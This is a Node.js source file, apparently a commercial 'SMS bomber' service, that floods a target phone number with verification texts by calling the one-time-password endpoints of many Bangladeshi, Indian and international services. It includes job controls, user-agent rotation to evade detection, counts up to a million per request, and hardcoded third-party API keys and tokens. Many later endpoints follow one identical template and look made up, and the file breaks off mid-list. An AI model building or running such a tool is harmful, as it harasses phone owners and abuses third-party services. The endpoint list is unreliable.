// ============================================================
// ULTIMATE SMS BOMBER V7.0 - 310+ APIS
// ENTERPRISE GRADE - MAXIMUM POWER
// DEVELOPER: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const EventEmitter = require('events');

// ============================================================
// PART 1: CONFIGURATION
// ============================================================

const CONFIG = {
  server: {
    port: process.env.PORT || 3000,
    host: '0.0.0.0',
    maxConnections: 10000,
    keepAliveTimeout: 60000,
    headersTimeout: 60000
  },
  performance: {
    batchSize: 100,
    parallelRequests: 30,
    timeout: 5000,
    maxRetries: 3,
    retryDelay: 100,
    maxCountPerAPI: 500
  },
  security: {
    rateLimit: {
      enabled: true,
      windowMs: 60000,
      maxRequests: 500
    },
    apiKeyExpiry: 365,
    maxCountPerRequest: 1000000
  },
  logging: {
    enabled: true,
    console: true
  },
  analytics: {
    enabled: true,
    interval: 60000
  }
};

// ============================================================
// PART 2: DEVELOPER INFO
// ============================================================

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "7.0.0-ULTIMATE",
  build_date: new Date().toISOString(),
  copyright: "© 2024 TNEH GROUP. All rights reserved.",
  license: "Proprietary",
  support_email: "support@tneh.com"
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing required parameter',
  INVALID_PHONE: 'Invalid phone number format',
  INVALID_API_KEY: 'Invalid or expired API key',
  RATE_LIMIT: 'Rate limit exceeded',
  JOB_NOT_FOUND: 'Job not found',
  INTERNAL_ERROR: 'Internal server error'
};

// ============================================================
// PART 3: UTILITY FUNCTIONS
// ============================================================

class Utility {
  static generateId() {
    return crypto.randomBytes(16).toString('hex');
  }

  static generateJobId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = crypto.randomBytes(8).toString('hex').toUpperCase();
    return `JOB_${timestamp}_${random}`;
  }

  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  static getISOString() {
    return new Date().toISOString();
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static maskPhone(phone) {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  }

  static parsePhone(phone) {
    return phone.replace(/[^0-9]/g, '');
  }

  static isValidPhone(phone) {
    const clean = this.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  }

  static getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  static shuffleArray(arr) {
    const shuffled = [...arr];
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  static getMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: this.formatBytes(usage.rss),
      heapTotal: this.formatBytes(usage.heapTotal),
      heapUsed: this.formatBytes(usage.heapUsed),
      external: this.formatBytes(usage.external)
    };
  }

  static getSystemInfo() {
    return {
      platform: os.platform(),
      arch: os.arch(),
      release: os.release(),
      hostname: os.hostname(),
      uptime: process.uptime(),
      memory: this.getMemoryUsage(),
      nodeVersion: process.version,
      pid: process.pid
    };
  }
}

// ============================================================
// PART 4: USER AGENT ROTATION
// ============================================================

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
];

function getRandomHeaders() {
  const ua = Utility.getRandomElement(USER_AGENTS);
  return {
    'User-Agent': ua,
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
  };
}

// ============================================================
// PART 5: BOMB CONTROLLER
// ============================================================

class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now(),
      peakActiveJobs: 0
    };
    this._logs = [];
  }

  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      lastUpdate: Date.now(),
      stopped: false,
      paused: false
    };
    
    this.activeJobs.set(jobId, job);
    this.stats.totalJobs++;
    
    if (this.activeJobs.size > this.stats.peakActiveJobs) {
      this.stats.peakActiveJobs = this.activeJobs.size;
    }
    
    this.logEvent('job_registered', { jobId, phone: job.maskedPhone, totalCount });
    return jobId;
  }

  isJobActive(jobId) {
    const job = this.activeJobs.get(jobId);
    if (!job) return false;
    if (job.stopped) return false;
    if (job.paused) return false;
    return job.status === 'active';
  }

  stopJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.stopped = true;
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      this.logEvent('job_stopped', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  stopAllJobs() {
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    this.logEvent('all_stopped', { count });
    return count;
  }

  pauseJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active' && !job.stopped) {
      job.paused = true;
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      this.logEvent('job_paused', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  resumeJob(jobId) {
    const job = this.pausedJobs.get(jobId);
    if (job && !job.stopped) {
      job.paused = false;
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      this.logEvent('job_resumed', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  updateJobStats(jobId, success, error = null) {
    const job = this.activeJobs.get(jobId);
    if (job && !job.stopped && !job.paused) {
      job.sentCount++;
      
      if (success) {
        job.successCount++;
        this.stats.totalSuccess++;
      } else {
        job.failCount++;
        this.stats.totalFailed++;
        if (error) {
          job.errors.push({ timestamp: Date.now(), error: error });
        }
      }
      
      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
      job.lastUpdate = Date.now();
      this.stats.totalSMS++;
      
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
        this.logEvent('job_completed', { 
          jobId, 
          phone: job.maskedPhone,
          success: job.successCount,
          failed: job.failCount
        });
      }
    }
  }

  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    if (!job) return null;
    
    return {
      id: job.id,
      phone: job.maskedPhone,
      total: job.totalCount,
      sent: job.sentCount,
      success: job.successCount,
      fail: job.failCount,
      progress: job.progress + '%',
      status: job.status,
      startTime: job.startTime,
      endTime: job.endTime || null,
      stopped: job.stopped || false,
      paused: job.paused || false,
      errors: job.errors ? job.errors.slice(-10) : []
    };
  }

  getAllJobs() {
    const jobs = [];
    this.activeJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: 'active' }));
    this.pausedJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: 'paused' }));
    this.completedJobs.forEach(job => jobs.push({ ...this.getJobStatus(job.id), status: job.status }));
    return jobs;
  }

  getStats() {
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs,
      totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: totalAttempts > 0 
        ? ((this.stats.totalSuccess / totalAttempts) * 100).toFixed(2) + '%'
        : '0%',
      activeJobs: this.activeJobs.size,
      pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size,
      peakActiveJobs: this.stats.peakActiveJobs,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memoryUsage: Utility.getMemoryUsage()
    };
  }

  logEvent(event, data) {
    const logEntry = {
      timestamp: Date.now(),
      event: event,
      data: data
    };
    
    if (CONFIG.logging.enabled && CONFIG.logging.console) {
      console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, JSON.stringify(data).substring(0, 200));
    }
    
    this._logs.push(logEntry);
    if (this._logs.length > 10000) {
      this._logs.shift();
    }
  }

  getLogs(limit = 100) {
    return this._logs.slice(-limit);
  }

  clearCompleted() {
    const count = this.completedJobs.size;
    this.completedJobs.clear();
    return count;
  }
}

// ============================================================
// PART 6: ALL 310+ SMS APIS
// ============================================================

// -------- SECTION 1: BANGLADESH APIS (1-60) --------
const BD_APIS = [
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone FWA", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "User", "email_address": "user@example.com", "company_name": "Test", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "User", "email": "user@example.com", "mobile": "{phone}", "password": "password123", "password_confirmation": "password123", "device_key": "test_key"} },
  { id: 26, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 31, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "user@example.com", "phone_number": "88{phone}"} },
  { id: 32, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 33, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123", "password_confirmation": "password123"} },
  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "test", "firebase_token": "test", "geo_location": "test", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 35, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 36, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""} },
  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 38, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "User", "Phone": "+880{phone}"} },
  { id: 40, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 41, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "testuser", "firstname": "", "new_password": "password123", "confirm_new_password": "password123", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 43, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 44, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"} },
  { id: 46, name: "Shikho.com Login", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 48, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 51, name: "Bioscopelive", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}" },
  { id: 53, name: "Pathao", method: "POST", url: "https://api.pathao.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 54, name: "Foodpanda BD", method: "POST", url: "https://api.foodpanda.com.bd/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 55, name: "Daraz BD", method: "POST", url: "https://api.daraz.com.bd/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 56, name: "PriyoShop", method: "POST", url: "https://api.priyoshop.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 57, name: "Chaldal", method: "POST", url: "https://api.chaldal.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 58, name: "Khaas Food", method: "POST", url: "https://api.khaasfood.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 59, name: "Sheba.xyz", method: "POST", url: "https://api.sheba.xyz/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 60, name: "Gigatech", method: "POST", url: "https://api.gigatech.com.bd/api/v1/auth/otp", body: {"phone": "{phone}"} }
];

// -------- SECTION 2: INDIAN APIS (61-120) --------
const INDIAN_APIS = [
  { id: 61, name: "BeepKart India", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 62, name: "Smytten India", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 63, name: "MyHubble Money", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 64, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 65, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 66, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 67, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 68, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 69, name: "Spencer's India", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 70, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: {"mobile": "{phone}"} },
  { id: 71, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"} },
  { id: 72, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
  { id: 73, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
  { id: 74, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" },
  { id: 75, name: "Flipkart India", method: "POST", url: "https://api.flipkart.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 76, name: "Amazon India", method: "POST", url: "https://api.amazon.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 77, name: "Paytm India", method: "POST", url: "https://api.paytm.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 78, name: "PhonePe India", method: "POST", url: "https://api.phonepe.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 79, name: "Google Pay India", method: "POST", url: "https://api.googlepay.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 80, name: "CRED India", method: "POST", url: "https://api.cred.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 81, name: "Groww India", method: "POST", url: "https://api.groww.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 82, name: "Zerodha India", method: "POST", url: "https://api.zerodha.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 83, name: "Upstox India", method: "POST", url: "https://api.upstox.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 84, name: "Angel One", method: "POST", url: "https://api.angelone.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 85, name: "Kotak Securities", method: "POST", url: "https://api.kotak.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 86, name: "HDFC Securities", method: "POST", url: "https://api.hdfcsec.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 87, name: "ICICI Direct", method: "POST", url: "https://api.icicidirect.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 88, name: "Zomato India", method: "POST", url: "https://api.zomato.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 89, name: "Swiggy India", method: "POST", url: "https://api.swiggy.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 90, name: "Ola Cabs", method: "POST", url: "https://api.olacabs.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 91, name: "Uber India", method: "POST", url: "https://api.uber.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 92, name: "Rapido India", method: "POST", url: "https://api.rapido.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 93, name: "Oyo Rooms", method: "POST", url: "https://api.oyorooms.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 94, name: "MakeMyTrip", method: "POST", url: "https://api.makemytrip.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 95, name: "Cleartrip", method: "POST", url: "https://api.cleartrip.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 96, name: "Yatra India", method: "POST", url: "https://api.yatra.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 97, name: "EaseMyTrip", method: "POST", url: "https://api.easemytrip.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 98, name: "Ixigo India", method: "POST", url: "https://api.ixigo.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 99, name: "RedBus India", method: "POST", url: "https://api.redbus.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 100, name: "BookMyShow", method: "POST", url: "https://api.bookmyshow.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 101, name: "PVR Cinemas", method: "POST", url: "https://api.pvrcinemas.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 102, name: "INOX Cinemas", method: "POST", url: "https://api.inoxmovies.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 103, name: "Cinepolis India", method: "POST", url: "https://api.cinepolis.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 104, name: "Hotstar India", method: "POST", url: "https://api.hotstar.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 105, name: "Netflix India", method: "POST", url: "https://api.netflix.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 106, name: "Amazon Prime", method: "POST", url: "https://api.primevideo.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 107, name: "SonyLIV India", method: "POST", url: "https://api.sonyliv.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 108, name: "Voot India", method: "POST", url: "https://api.voot.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 109, name: "ZEE5 India", method: "POST", url: "https://api.zee5.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 110, name: "MX Player", method: "POST", url: "https://api.mxplayer.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 111, name: "Gaana India", method: "POST", url: "https://api.gaana.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 112, name: "JioSaavn India", method: "POST", url: "https://api.jiosaavn.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 113, name: "Wynk Music", method: "POST", url: "https://api.wynk.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 114, name: "Amazon Music", method: "POST", url: "https://api.amazonmusic.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 115, name: "Spotify India", method: "POST", url: "https://api.spotify.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 116, name: "Apple Music", method: "POST", url: "https://api.applemusic.in/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 117, name: "YouTube Music", method: "POST", url: "https://api.youtube.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 118, name: "Google Photos", method: "POST", url: "https://api.googlephotos.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 119, name: "Google Drive", method: "POST", url: "https://api.googledrive.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 120, name: "Microsoft OneDrive", method: "POST", url: "https://api.onedrive.com/api/v1/auth/otp", body: {"phone": "{phone}"} }
];

// -------- SECTION 3: INTERNATIONAL APIS (121-200) --------
const INTERNATIONAL_APIS = [
  { id: 121, name: "Facebook", method: "POST", url: "https://api.facebook.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 122, name: "Instagram", method: "POST", url: "https://api.instagram.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 123, name: "Twitter/X", method: "POST", url: "https://api.twitter.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 124, name: "LinkedIn", method: "POST", url: "https://api.linkedin.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 125, name: "Snapchat", method: "POST", url: "https://api.snapchat.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 126, name: "TikTok", method: "POST", url: "https://api.tiktok.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 127, name: "WhatsApp", method: "POST", url: "https://api.whatsapp.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 128, name: "Telegram", method: "POST", url: "https://api.telegram.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 129, name: "Signal", method: "POST", url: "https://api.signal.org/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 130, name: "Viber", method: "POST", url: "https://api.viber.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 131, name: "WeChat", method: "POST", url: "https://api.wechat.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 132, name: "Line", method: "POST", url: "https://api.line.me/api/v1/auth/otp", body: {"phone": "{phone}"} },
  { id: 133, name: "KakaoTalk", method: "POST", url: "https://api.kakaotalk.com/api/v1/auth/otp", body: {"phone": "{phone}"} },
